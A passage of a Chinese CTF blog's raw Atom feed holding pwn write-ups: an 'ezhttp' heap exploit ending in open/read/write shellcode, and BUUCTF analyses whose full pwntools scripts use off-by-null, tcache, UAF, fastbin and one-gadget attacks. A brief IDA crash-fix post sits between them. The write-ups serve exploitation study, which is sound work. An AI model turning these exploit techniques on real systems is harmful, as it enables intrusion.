elf.libc    #libc = ELF(&apos;.&apos;)context.arch = elf.archcontext.terminal = [&apos;tmux&apos;,&apos;neww&apos;]#,&apos;&apos;splitw&apos;,&apos;-h&apos;arae18 = 0x3ebca0s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &apos;\0&apos;))uu64    = lambda data               :u64(data.ljust(8, &apos;\0&apos;))info_addr = lambda tag, addr        :io.info(tag + &apos;==&gt;&apos; +&apos;: &#123;:#x&#125;&apos;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&apos;b main&apos;)    gdb.attach(io)    pause()# debug()def add(data):    content = &apos;POST\n&apos;    content += &apos;/create \nCookie: user=admin token: \r\n\r\n&apos;    content += &apos;content=&apos;+str(data)    ru(&apos;Send Http packet to me:&apos;)    s(str(content))    sleep(0.05)def free(index):    content = &apos;POST\n&apos;    content += &apos;/del \nCookie: user=admin token: \r\n\r\n&apos;    content += &apos;index=&apos;+str(index)    ru(&apos;Send Http packet to me:&apos;)    s(str(content))def edit(idx,data):    content = &apos;POST\n&apos;    content += &apos;/edit \nCookie: user=admin token: \r\n\r\n&apos;    content += &apos;index=&apos;+ str(idx) + &apos;&amp;content=&apos;+str(data)+ &apos;\n&apos;    s(str(content))    sleep(0.05)def leak_addr():    payload = &apos;1&apos; *0x100    add(payload)     ru(&apos;0x&apos;)    heap_base = int(r(12),16) - 0x10    info_addr(&apos;heap_base&apos;,heap_base)    add(payload)     add(&apos;1&apos;*0x8)     add(&apos;1&apos;*0xf8)    for i in range(7):        free(0)    free(0)    add(&apos;\x60\xa7&apos;)     add(&apos;1&apos;*0x18)     add(&apos;1&apos;*0x20)     free(6)    free(6)    add(&apos;1&apos;*0x20)     payload = p64(heap_base + 0x10)    edit(7,payload)    add(&apos;1&apos;*0x20)     # debug()    add(&apos;1&apos;*0x20)     sleep(0.1)    payload = p64(0x12345678fbad3c80) + &apos;\x01&apos; *0x20    add(payload) #8    payload = p64(0xfbad3c80) + p64(0) * 3 + &apos;\x00&apos;    edit(10,payload)    add(&apos;1&apos;*0x90)    return heap_baseleak = 0while True:    try:        heap_base = leak_addr()        ss = io.recvuntil(chr(0x7f),timeout = 0.5)        if len(ss) == 0:            raise Exception(&apos;&apos;)        io.recv(16)        leak = u64(io.recv(8))        if leak == 0x320a6464412e310a:            raise Exception(&apos;&apos;)        break    except Exception:        io.close()        io = process(&apos;./ezhttp&apos;)        continueleak = leak &gt;&gt; 16info_addr(&apos;leak&apos;,leak)libc_base = leak - 0x3eb780info_addr(&apos;libc_base&apos;,libc_base)free_hook = 0x3ed8e8 + libc_baseset_context = libc.sym[&apos;setcontext&apos;] + 53 + libc_baseinfo_addr(&apos;heap_base&apos;,heap_base)info_addr(&apos;context&apos;,set_context)orw = shellcraft.open(&apos;./flag&apos;)orw +=shellcraft.read(&apos;rax&apos;,heap_base+0x300,0x30)orw +=shellcraft.write(1,heap_base+0x300,0x30)edit(11,asm(orw))# debug()frame = SigreturnFrame()frame.rdi = 0frame.rsi = free_hookframe.rdx = 0x300frame.rsp = free_hookframe.rip = libc_base + libc.search(asm(&quot;syscall \nret&quot;)).next()edit(1,str(frame))free(2)free(2)free(2)# debug()add(p64(free_hook))add(&apos;1&apos;*6)info_addr(&apos;context&apos;,set_context)add(p64(set_context))# debug()free(1)pop_rdi = 0x000000000002155f+libc_basepop_rsi = 0x0000000000023e8a+libc_basepop_rdx = libc_base+0x0000000000001b96pop_rax = libc_base+0x0000000000043a78payload = flat([pop_rdi,heap_base-0x250,pop_rsi,0x1000,pop_rdx,7,libc_base+libc.sym[&apos;mprotect&apos;],heap_base+0x80])s(payload)itr()</code></pre></div></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;西湖论剑部分wp&quot;&gt;&lt;a href=&quot;#西湖论剑部分wp&quot; class=&quot;headerlink&quot; title=&quot;西湖论剑部分wp&quot;&gt;&lt;/a&gt;西湖论剑部分wp&lt;/h1&gt;&lt;h2 id=&quot;mmutag&quot;&gt;&lt;a href=&quot;#mmutag&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>mac 上ida 7.0 闪退 打不开 解决办法</title>
    <link href="http://chumen77.xyz/2020/10/06/mac%20%E4%B8%8Aida%207.0%20%E9%97%AA%E9%80%80%20%E6%89%93%E4%B8%8D%E5%BC%80%20%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/"/>
    <id>http://chumen77.xyz/2020/10/06/mac 上ida 7.0 闪退 打不开 解决办法/</id>
    <published>2020-10-06T14:37:29.022Z</published>
    <updated>2020-10-09T00:22:47.125Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mac-上ida-7-0-闪退-打不开-解决办法"><a href="#mac-上ida-7-0-闪退-打不开-解决办法" class="headerlink" title="mac 上ida 7.0 闪退 打不开 解决办法"></a>mac 上ida 7.0 闪退 打不开 解决办法</h1><h2 id="情景1"><a href="#情景1" class="headerlink" title="情景1"></a>情景1</h2><p>下载以后直接不能用的。</p><p><a href="https://github.com/fjh658/IDA7.0_SP" target="_blank" rel="noopener">https://github.com/fjh658/IDA7.0_SP</a></p><p><a href="https://github.com/swfangzhang/IDA-pro-7-for-Catalina-OSX-15" target="_blank" rel="noopener">https://github.com/swfangzhang/IDA-pro-7-for-Catalina-OSX-15</a></p><p>参考这个两个github的项目即可。</p><h2 id="情景2"><a href="#情景2" class="headerlink" title="情景2"></a>情景2</h2><p>平时正常使用，突然因为装了冲突的插件打不开ida，直接crash。或者莫名点击ida图标就没有任何反应。进入ida.app bin 下的ida，双击执行命令行中，会显示内核错误的情况。</p><div class="hljs"><pre><code class="hljs python">~ cd .idapro ~/.idapro  rm -rf ida.reg</code></pre></div><p>这样就可以解决了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;mac-上ida-7-0-闪退-打不开-解决办法&quot;&gt;&lt;a href=&quot;#mac-上ida-7-0-闪退-打不开-解决办法&quot; class=&quot;headerlink&quot; title=&quot;mac 上ida 7.0 闪退 打不开 解决办法&quot;&gt;&lt;/a&gt;mac 上ida 7.0 闪
      
    
    </summary>
    
    
      <category term="杂项" scheme="http://chumen77.xyz/tags/%E6%9D%82%E9%A1%B9/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF 刷题记录</title>
    <link href="http://chumen77.xyz/2020/09/28/BUUCTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://chumen77.xyz/2020/09/28/BUUCTF刷题记录/</id>
    <published>2020-09-28T11:24:58.046Z</published>
    <updated>2020-11-27T12:48:44.066Z</updated>
    
    <content type="html"><![CDATA[<h1 id="BUUCTF刷题记录"><a href="#BUUCTF刷题记录" class="headerlink" title="BUUCTF刷题记录"></a>BUUCTF刷题记录</h1><h2 id="GKCTF-2020-demo"><a href="#GKCTF-2020-demo" class="headerlink" title="GKCTF 2020 demo"></a>GKCTF 2020 demo</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>开启了沙箱，不过在main函数的最后，在while循环里做动作就不会触发到。<br>其中add和free 函数，上来都会检测<code>free_hook malloc_hook</code> 是否不为0，不为0就不让进行相应的操作。</p><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( (nbytes &amp; <span class="hljs-number">0x80000000</span>) == <span class="hljs-number">0L</span>L &amp;&amp; nbytes &lt;= <span class="hljs-number">0x120</span> )       &#123;         heaplist[SHIDWORD(nbytes)] = <span class="hljs-built_in">malloc</span>(nbytes);         <span class="hljs-built_in">puts</span>(<span class="hljs-string">"content:"</span>);         read(<span class="hljs-number">0</span>, heaplist[SHIDWORD(nbytes)], nbytes);         *(heaplist[SHIDWORD(nbytes)] + nbytes) = <span class="hljs-number">0</span>;<span class="hljs-comment">// off by null</span>         ++counts;       &#125;</code></pre></div><p>Add中存在<code>OFF BY NULL</code>。</p><h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>利用off by null 构造一个堆重叠</li><li>泄漏出libc地址</li><li>2次释放重叠的chunk，进行fastbin attack <code>malloc_hook_</code>为 one gadget</li><li>通过读入choice的scanf函数，传送大量字节，其会调用malloc申请chunk，即可get shell</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./domo'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27019</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-string">''' line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009 0002: 0x20 0x00 0x00 0x00000000  A = sys_number 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x04 0xffffffff  if (A != 0xffffffff) goto 0009 0005: 0x15 0x03 0x00 0x0000000a  if (A == mprotect) goto 0009 0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009 0007: 0x15 0x01 0x00 0xffffd8b6  if (A == 0xffffd8b6) goto 0009 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0009: 0x06 0x00 0x00 0x00000000  return KILL'''</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'1'</span>) add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>) add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'1'</span>) free(<span class="hljs-number">1</span>)free(<span class="hljs-number">0</span>)data = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0x60</span>+p64(<span class="hljs-number">0x100</span>)add(<span class="hljs-number">0x68</span>,data)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">0x80</span>,<span class="hljs-string">'\x00'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'\x00'</span>)add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'1'</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">5</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">4</span>)r()libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b31</span>info_addr(<span class="hljs-string">'libc_base '</span>,libc_base)malloc_hook=libc_base+libc.symbols[<span class="hljs-string">'__malloc_hook'</span>]realloc_hook=libc_base+libc.symbols[<span class="hljs-string">'realloc'</span>]add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))add(<span class="hljs-number">0x68</span>,p64(malloc_hook<span class="hljs-number">-0x23</span>))onegadget = <span class="hljs-number">0x4526a</span> + libc_basedata = <span class="hljs-string">'\x00'</span>*<span class="hljs-number">0xb</span>+p64(onegadget)+ p64(realloc_hook+realloc[<span class="hljs-number">0</span>])add(<span class="hljs-number">0x68</span>,data)sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">500</span>)<span class="hljs-comment"># debug()</span>itr()</code></pre></div><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><ul><li>还可以攻击<code>calloc_hook</code>,因为seccomp里面调用了calloc。</li><li>攻击io file 进行泄漏和orw。（先等待复现）<br><a href="https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py" target="_blank" rel="noopener">https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py</a></li></ul><h2 id="gyctf-2020-signin"><a href="#gyctf-2020-signin" class="headerlink" title="gyctf_2020_signin"></a><code>gyctf_2020_signin</code></h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><ul><li>uaf，但是存在一个flag位用于检测是否free过</li><li>edit只能一次</li><li>存在后门函数，其中还会用calloc申请一个chunk,并且只需要<code>0x004040C0</code>处有数值即可触发。</li></ul><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="calloc-的特性："><a href="#calloc-的特性：" class="headerlink" title="calloc 的特性："></a>calloc 的特性：</h4><ul><li>在申请到的chunk上会进行一个置零的操作</li><li>不会从tcache bin 中取chunk <h4 id="tcache-的-int-malloc有以下特性："><a href="#tcache-的-int-malloc有以下特性：" class="headerlink" title="tcache 的_int_malloc有以下特性："></a>tcache 的<code>_int_malloc</code>有以下特性：</h4></li></ul><p>在分配 fastbin 中的 chunk 时，若此chain上还有其他chunk ，则调用<code>tcache_put</code>把它们全部放入 tcache 中(smallbins中也是如此)。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-comment">/* While we're here, if we see other chunks of the same size, stash them in the tcache.  */</span>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)&#123;  mchunkptr tc_victim;  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count     &amp;&amp; (pp = *fb) != <span class="hljs-literal">NULL</span>)    &#123;      REMOVE_FB (fb, tc_victim, pp);      <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)    &#123;      tcache_put (tc_victim, tc_idx);&#125;    &#125;&#125;</code></pre></div><h3 id="攻击思路-1"><a href="#攻击思路-1" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>申请8个堆， 释放8个堆，最后一个会进入fastbin</li><li>edit idx=8 的chunk，改其fd为<code>0x004040C0 - 0x10</code></li><li>申请一个chunk，此时会在tcache chain中拿走一个，留出一个空位</li><li>调用后门函数，其中calloc会从fastbin中拿出idx=8的chunk，但是由于其特性，会把剩下的fd上地址也当作一个chunk丢进tcache</li><li>丢进时是丢在tcache的头部，所以会跟tcache 进行一个link。也就是会在这个fd地址上写下，tcache chain 上其紧挨着的chunk地址。这就造成一个任意地址写。</li></ul><p>漏洞产生原因也是，libc源码中<code>tcache_put</code>基本没有安全检查。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./gyctf_2020_signin'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27592</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    s(str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    add(i)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    free(i)edit(<span class="hljs-number">7</span>,p64(<span class="hljs-number">0x4040C0</span><span class="hljs-number">-0x10</span>))add(<span class="hljs-number">8</span>)sla(<span class="hljs-string">'your choice?'</span>,<span class="hljs-string">'6'</span>)debug()itr()</code></pre></div><h3 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h3><p>在做的时候，开始有个想法，malloc申请堆时，会在其返回地址的上方留下size信息，以此来利用。但是在验证后，发现是不会的。</p><h2 id="gyctf-2020-document"><a href="#gyctf-2020-document" class="headerlink" title="gyctf_2020_document"></a><code>gyctf_2020_document</code></h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><ul><li>存在uaf漏洞</li><li>只能申请一个0x20、0x90的堆块，不能进行fastbin进行攻击。</li></ul><h4 id="person数据结构"><a href="#person数据结构" class="headerlink" title="person数据结构"></a>person数据结构</h4><div class="hljs"><pre><code class="hljs undefined">                                                                                                   <span class="angelscript">┌──────────────────────┬────┐              │                      │<span class="hljs-number">0x21</span>│              ├─────────────┬────────┴────┤              │             │             │              │   main_heap │    flag     │              ├─────────────┴─────────────┤              │                       <span class="hljs-number">0x91</span>│              │─────────────┬─────────────┤              │             │             ├──────▶<span class="hljs-number">0x10</span>   │     name    │      sex    │              ├─────────────▼─────────────┤              │                           │              │                           │              │                           │              │                           │              │                           │              │          data             │              │                           │       ┌────┐ │                           ├──────▶│<span class="hljs-number">0x80</span>│ │                           │       └────┘ │                           │              │                           │              │                           │              │                           │              └───────────────────────────┘</span></code></pre></div><h3 id="攻击思路-2"><a href="#攻击思路-2" class="headerlink" title="攻击思路"></a>攻击思路</h3><ul><li>释放一个0x90的堆，利用uaf进行泄漏libc</li><li>申请2个堆，此时在这个0x90的unsortbin会留下2个0x20的person数据结构的头</li><li>edit这个释放的堆，控制其中<code>main_heap</code>的地址，然后进行任意地址写。</li></ul><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./gyctf_2020_document'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25009</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(name,sex,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)    sa(<span class="hljs-string">'name'</span>,str(name))    sa(<span class="hljs-string">'sex'</span>,str(sex))    sa(<span class="hljs-string">'infor'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,sex,data)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sa(<span class="hljs-string">'sex'</span>,str(sex))    sa(<span class="hljs-string">'infor'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'index'</span>,str(idx))data = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x78</span>add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)r()libc_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'W'</span>,data)free_hook = <span class="hljs-number">0x3c67a8</span> + libc_basedata = <span class="hljs-string">'\x00'</span>* <span class="hljs-number">8</span> + p64(<span class="hljs-number">0x71</span>) + p64(free_hook<span class="hljs-number">-0x10</span>) + <span class="hljs-string">'\x01'</span> * <span class="hljs-number">0x58</span>edit(<span class="hljs-number">0</span>,<span class="hljs-string">"N"</span>,data)data = p64(libc_base + <span class="hljs-number">0x4526a</span>) + <span class="hljs-number">0x68</span> * <span class="hljs-string">'\x00'</span>edit(<span class="hljs-number">3</span>,<span class="hljs-string">'N'</span>,data)free(<span class="hljs-number">0</span>)itr()</code></pre></div><h2 id="wdb-2018-guess"><a href="#wdb-2018-guess" class="headerlink" title="wdb_2018_guess"></a><code>wdb_2018_guess</code></h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p>主要就是利用stack smashing。</p><h4 id="stack-smashing"><a href="#stack-smashing" class="headerlink" title="stack smashing"></a>stack smashing</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><p>在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 <code>__stack_chk_fail</code>函数来打印 <code>argv[0]</code> 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="hljs-keyword">void</span>)&#123;  __fortify_fail (<span class="hljs-string">"stack smashing detected"</span>);&#125;<span class="hljs-keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *msg)&#123;  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">"*** %s ***: %s terminated\n"</span>,                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">"&lt;unknown&gt;"</span>);&#125;</code></pre></div><p>所以说如果我们利用栈溢出覆盖 